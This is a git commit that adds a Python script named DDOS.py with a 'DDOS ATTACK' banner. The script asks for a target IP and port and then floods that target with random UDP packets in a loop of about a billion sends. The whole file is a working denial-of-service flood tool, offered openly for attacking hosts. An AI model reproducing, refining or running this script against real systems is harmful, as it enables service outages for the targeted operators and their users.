4f0d16bffa84354748b078dc2fae67dd034e463d
Lord1991 <108490785+Lord1991@users.noreply.github.com>
2023-01-13 14:33:30 +0100

    Add files via upload

---
+++ DDOS.py
@@ -0,0 +1,16 @@
+import pyfiglet
+import socket , random
+log = pyfiglet.figlet_format('DDOS ATTACK')
+GG = '--------------------------------------------------------------'
+wol = f'{GG}\n{log}{GG}'
+print(wol)
+print("BY lord")
+print('-------------------------------------------------------------')
+HOSTNAME = input('ENTER THE HOSTNAME IP NOT URL: ')
+PRT  = int(input('ENTER THE PORT : '))
+print ("START :)")
+ME = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
+ME.connect((HOSTNAME , PRT))
+for i in range(100*10000000):
+    DATA = ME.send(random._urandom(10)*1000)
+    print(f"SEND : {i}")
